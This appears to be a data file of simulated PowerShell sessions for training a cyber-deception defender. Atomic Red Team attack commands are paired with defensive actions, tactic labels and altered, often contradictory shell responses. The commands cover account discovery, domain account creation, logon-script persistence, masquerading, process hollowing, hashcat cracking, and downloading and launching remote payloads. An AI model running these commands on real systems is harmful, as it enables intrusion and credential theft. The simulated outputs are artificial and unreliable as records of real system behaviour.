+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:Write-Host: You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:4
+technique:115
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris> $registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+PS C:\Users\chris>
+tactic:1
+technique:115
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris> $registryValue = "AccessVBOM"
+PS C:\Users\chris>
+tactic:7
+technique:115
+
+
+action:{ Restore to original state }
+command:$registryData = "1"
+response:PS C:\Users\chris> $registryData = "1"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ if response is file content, modify the file content }
+command:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+response:PS C:\Users\chris> $flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ modify powershell response }
+command:$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+response:PS C:\Users\chris> $flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ allow command execute this time }
+command:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+response:PS C:\Users\chris> $value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Block this command this time }
+command:if ($value -eq "1") 
+response:The term 'if' is not recognized as a name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ modify powershell response }
+command:{
+response:PS C:\Users\chris> { 
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ modify the response by change the access right }
+command:  Write-Host "The registry value '$registryValue' already exists with the required setting."
+response:Write-Host: The registry value '$registryValue' already exists with the required setting.
+PS C:\Users\chris>
+tactic:0
+technique:130
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:}   
+response:PS C:\Users\chris> 
+tactic:1
+technique:130
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:  elseif ($value -eq "0") 
+response:The term 'elseif' is not recognized as a name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:
+command:{
+response:PS C:\Users\chris> { 
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:  Write-Host "The registry value was set to 0, temporarily changing to 1."
+response:PS C:\Users\chris>  Write-Host "The registry value was set to 0, temporarily changing to 1."
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Block this command this time }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:The term 'New-ItemProperty' is not recognized as a name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:  echo "flag1" > $flagPath1
+response:PS C:\Users\chris> 
+tactic:1
+technique:130
+
+
+action:{ modify the response by change the access right }
+command:} 
+response:PS C:\Users\chris> } 
+PS C:\Users\chris>
+tactic:11
+technique:130
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:  else 
+response:The term 'else' is not recognized as a name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Restore to original state }
+command:{
+response:PS C:\Users\chris> { 
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+response:PS C:\Users\chris>  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ modify the response by change the access right }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris> New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:  echo "flag2" > $flagPath2
+response:PS C:\Users\chris> echo "flag2" > $flagPath2
+PS C:\Users\chris>
+action:{ if response is file content, modify the file content }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:6
+technique:134
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:net localgroup
+response:Alias name     Members
+-----------     -------
+Administrators  chris
+Guests          *
+Power Users     *
+Users           chris
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ modify the response by change the access right }
+command:net group /domain
+response:Group Name                             SID                                                             Attributes
+-----------                             ---                                                             ----------
+Domain Admins                          S-1-5-21-1234567890-123456789-1234567890-512                 Group Admins
+Domain Users                           S-1-5-21-1234567890-123456789-1234567890-513                 Default Group
+Domain Guests                          S-1-5-21-1234567890-123456789-1234567890-514                 Group Guests
+Domain Computers                       S-1-5-21-1234567890-123456789-1234567890-515                 Computers
+Domain Controllers                     S-1-5-21-1234567890-123456789-1234567890-516                 Group Domain
+
+PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:net group "enterprise admins" /domain
+response:Group Name                             SID                                                             Attributes
+-----------                             ---                                                             ----------
+Enterprise Admins                     S-1-5-21-1234567890-123456789-1234567890-519                 Group Admins
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ if response is file content, modify the file content }
+command:net group "domain admins" /domain
+response:Group Name                             SID                                                             Attributes
+-----------                             ---                                                             ----------
+Domain Admins                          S-1-5-21-1234567890-123456789-1234567890-512                 Group Admins
+
+Members
+-------
+chris
+admin
+
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ modify the response by change the access right }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:The command completed successfully.
+
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:New-Item : Access to the path 'C:\atomics\T1010\src\T1010.cs' is denied.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : UnauthorizedAccess: (C:\atomics\T1010\src\T1010.cs:String) [New-Item], UnauthorizedAccessException
+    + FullyQualifiedErrorId : CreateDirectoryUnauthorizedAccessError,Microsoft.PowerShell.Commands.NewItemCommand
+
+PS C:\Users\chris>
+action:{ if response is upload or download, Block this command by the network traffic }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:6
+technique:200
+
+
+action:{ if response is file content, modify the file content }
+command:if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+response:PS C:\Users\chris> if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+>> 
+>> }
+PS C:\Users\chris>
+action:{ if response is upload or download, Block this command by the network traffic }
+command:whoami
+response:chris
+tactic:5
+technique:112
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:New-Item -Type Directory (split-path "C:\atomics\T1036.003\bin\T1036.003.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:5
+technique:112
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe" -OutFile "C:\atomics\T1036.003\bin\T1036.003.exe"
+response:Invoke-WebRequest : The request was aborted: Unable to create the network connection.
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe" ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+
+PS C:\Users\chris>
+action:
+command:whoami
+response:chris
+tactic:1
+technique:10
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS > New-Item : Cannot find path 'C:\atomics\T1010\src\T1010.cs' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1010\src\T1010.cs:String) [New-Item], IOException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemCommand
+
+PS >
+tactic:1
+technique:10
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:PS > Invoke-WebRequest : The remote name could not be resolved: 'raw.githubusercontent.com'
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotImplemented: (:) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : NameResolutionFailure,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS >
+tactic:4
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe : The system cannot find the file specified.
+At line:1 char:1
++ C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe:String) [csc.exe], FileNotFoundException
+    + FullyQualifiedErrorId : FileNotFoundException
+
+PS >
+action:{ if response contain network speed, Degrade the network speed }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Block this command this time }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Invoke-WebRequest : The term 'Invoke-WebRequest' is not recognized as a cmdlet, function, script file, or operable program.  
+At line:1 char:1  
++ Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"  
++ ~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : ObjectNotFound: (Invoke-WebRequest:String) [], CommandNotFoundException  
+    + FullyQualifiedErrorId : CommandNotFoundException  
+  
+PS C:\Users\chris>
+action:{ modify the response by change the access right }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:3
+technique:134
+
+
+action:{ Restore to original state }
+command:net groups "Account Operators" /doma
+response:Removing account from group "Account Operators"...
+The operation completed successfully.
+
+PS C:\Users\chris>
+tactic:3
+technique:134
+
+
+action:{ modify the response by change the access right }
+command:net groups "Exchange Organization Management" /doma
+response:Removing account from group "Exchange Organization Management"...
+Access is denied.
+
+PS C:\Users\chris>
+tactic:8
+technique:134
+
+
+action:{ modify powershell response }
+command:net group "BUILTIN\Backup Operators" /doma
+response:Group Name                                   SID
+-----------------------------------------      --------------------------------
+Backup Operators                             S-1-5-32-551
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+BackupEngine
+PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:net group /domai "Domain Admins"
+response:The syntax of the command is incorrect.
+
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:Access to the network resource has been blocked.
+
+PS C:\Users\chris>
+action:{ if response is file content, modify the file content }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:1
+technique:97
+
+
+action:{ modify the response by change the access right }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris>
+
+tactic:1
+technique:105
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "C:\atomics\..\ExternalPayloads\7z1900.exe"
+response:PS C:\Users\chris>
+
+tactic:7
+technique:194
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:Start-Process -FilePath "C:\atomics\..\ExternalPayloads\7z1900.exe" -ArgumentList "/S /D=C:\atomics\..\ExternalPayloads\7zi" -NoNewWindow
+response:PS C:\Users\chris>
+
+tactic:1
+technique:40
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest "https://hashcat.net/files/hashcat-6.1.1.7z" -OutFile "C:\atomics\..\ExternalPayloads\hashcat6.7z"
+response:PS C:\Users\chris>
+
+tactic:8
+technique:41
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:Start-Process cmd.exe -Args  "/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip" -Wait
+response:PS C:\Users\chris>
+
+tactic:1
+technique:40
+
+
+action:
+command:New-Item -ItemType Directory (Split-Path $(cmd /c echo C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe)) -Force | Out-Null
+response:PS C:\Users\chris>
+
+tactic:1
+technique:1
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:Move-Item "C:\atomics\..\ExternalPayloads\hashcat-unzip\hashcat-6.1.1\*" $(cmd /c echo C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\..) -Force -ErrorAction Ignore
+response:PS C:\Users\chris>
+
+tactic:1
+technique:40
+
+
+action:
+command:cd C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\..
+response:PS C:\atomics\ExternalPayloads\hashcat6\hashcat-6.1.1>
+
+tactic:7
+technique:21
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule C:\atomics\T1110.002\src\sam.txt C:\atomics\T1110.002\src\password.lst
+response:PS C:\Users\chris>
+
+tactic:0
+technique:133
+
+
+action:{ Block this command this time }
+command:net user
+response:Access Denied.
+PS C:\Users\chris>
+tactic:5
+technique:21
+
+
+action:{ Block this command this time }
+command:get-localuser
+response:Access Denied.
+PS C:\Users\chris>
+action:{ modify the response by change the access right }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:4
+technique:141
+
+
+action:
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:Start-Hollow : File C:\atomics\T1055.012\src\Start-Hollow.ps1 cannot be loaded. The file is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170
+At line:1 char:1
++ . "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ if response is file content, modify the file content }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris> $ppid=Get-Process explorer | select -expand id
+PS C:\Users\chris> 
+
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:Start-Hollow : File C:\atomics\T1055.012\src\Start-Hollow.ps1 cannot be loaded. The file is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170
+At line:1 char:1
++ Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Wi...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1001.002\bin\T1001.002.jpg") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory (split-path "C:\atomics\T1001.002\bin\T1001.002.jpg") -ErrorAction ignore | Out-Null
+PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ Block this command this time }
+command:Write-Output "Downloading image file..."
+response:Write-Output : The term 'Write-Output' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Write-Output "Downloading image file..."
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Write-Output:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+action:{ allow command execute this time }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:17
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS C:\Users\chris> 
+
+tactic:7
+technique:17
+
+
+action:{ modify the response by change the access right }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:ERROR: Access is denied.
+
+PS C:\Users\chris>
+tactic:4
+technique:134
+
+
+action:{ modify powershell response }
+command:net groups "Account Operators" /doma
+response:Group Name                                            Members
+
+------------------------------------------------------------
+Account Operators                                     User1
+                                                      User2
+                                                      User3
+
+The command completed successfully.
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Block this command this time }
+command:net groups "Exchange Organization Management" /doma
+response:Access is denied.
+
+PS C:\Users\chris>
+action:{ if response is file content, modify the file content }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:1
+technique:40
+
+
+action:
+command:echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"
+response:Hello from the Windows Command Prompt!
+PS C:\Users\chris>
+tactic:5
+technique:112
+
+
+action:{ Block this command this time }
+command:New-Item -Type Directory (split-path "C:\atomics\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs") -ErrorAction ignore | Out-Null
+response:New-Item : The specified path is not valid.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs") -ErrorAction ignore | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [New-Item], ArgumentException
+    + FullyQualifiedErrorId : PathInvalid,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:5
+technique:112
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs" -OutFile "C:\atomics\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"
+response:Invoke-WebRequest : Access to the path denied.
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs" -OutFile "C:\atomics\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : UnauthorizedAccess: (C:\atomics\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs:String) [Invoke-WebRequest], IOException
+    + FullyQualifiedErrorId : CreateFileUnauthorizedAccessError,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+PS C:\Users\chris>
+tactic:8
+technique:112
+
+
+action:{ Block this command this time }
+command:copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
+response:Access to the specified path is denied.
+PS C:\Users\chris>
+action:{ allow command execute this time }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:5
+technique:37
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:User ANONYMOUS LOGON has been successfully created.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ modify the response by change the access right }
+command:new-item "C:\atomics\..\ExternalPayloads\T1059_003note.txt" -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
+response:New-Item : The path 'C:\atomics\..\ExternalPayloads\T1059_003note.txt' is not a valid path.
+At line:1 char:1
++ new-item "C:\atomics\..\ExternalPayloads\T1059_003note.txt" -value ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (C:\atomics\..\ExternalPayloads\T1059_003note.txt:String) [New-Item], ArgumentException
+    + FullyQualifiedErrorId : PathAlreadyExists,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:2
+technique:29
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p C:\atomics\..\ExternalPayloads\T1059_003note.txt" | out-null
+response:The system cannot find the file specified.
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:The command was blocked due to network traffic rules.
+PS C:\Users\chris>
+action:
+command:whoami
+response:chris
+tactic:1
+technique:17
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS > echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS >
+tactic:1
+technique:17
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS > REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+The operation completed successfully.
+PS >
+tactic:1
+technique:141
+
+
+action:{ allow command execute this time }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS > New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+PS >
+tactic:4
+technique:141
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:PS > Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+Download-File: The network traffic has been blocked for this command.
+PS >
+action:{ Block this command this time }
+command:whoami
+response:PS C:\Users\chris> Blocked command. Please try a different command. 
+PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:
+command:net user
+response:User accounts for \\COMPUTERNAME
+
+-------------------------------------------------------------------------------
+Account name                 Administrator
+Account name                 Guest
+Account name                 User1
+-------------------------------------------------------------------------------
+The command completed successfully.
+
+PS C:\Users\chris>
+action:{ if response contain hardware setting, modify hardware setting }
+command:whoami
+response:hslab\chris
+PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ modify powershell response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ allow command execute this time }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Operation completed successfully.
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+PS C:\Users\chris>
+tactic:5
+technique:194
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest -OutFile "C:\atomics\..\ExternalPayloads\wireshark_installer.exe" https://1.eu.dl.wireshark.org/win64/Wireshark-latest-x64.exe
+response:PS C:\Users\chris> Invoke-WebRequest -OutFile "C:\atomics\..\ExternalPayloads\wireshark_installer.exe" https://1.eu.dl.wireshark.org/win64/Wireshark-latest-x64.exe
+PS C:\Users\chris> 
+tactic:5
+technique:194
+
+
+action:{ if response is file content, modify the file content }
+command:Start-Process "C:\atomics\..\ExternalPayloads\wireshark_installer.exe" /S
+response:PS C:\Users\chris> Start-Process "C:\atomics\..\ExternalPayloads\wireshark_installer.exe" /S
+PS C:\Users\chris>
+tactic:1
+technique:105
+
+
+action:{ modify powershell response }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+PS C:\Users\chris>
+tactic:5
+technique:194
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest -OutFile "C:\atomics\..\ExternalPayloads\npcap_installer.exe" https://nmap.org/npcap/dist/npcap-1.31.exe
+response:PS C:\Users\chris> Invoke-WebRequest -OutFile "C:\atomics\..\ExternalPayloads\npcap_installer.exe" https://nmap.org/npcap/dist/npcap-1.31.exe
+PS C:\Users\chris>
+tactic:5
+technique:194
+
+
+action:
+command:Start-Process "C:\atomics\..\ExternalPayloads\npcap_installer.exe"
+response:PS C:\Users\chris> Start-Process "C:\atomics\..\ExternalPayloads\npcap_installer.exe"
+PS C:\Users\chris>
+tactic:8
+technique:125
+
+
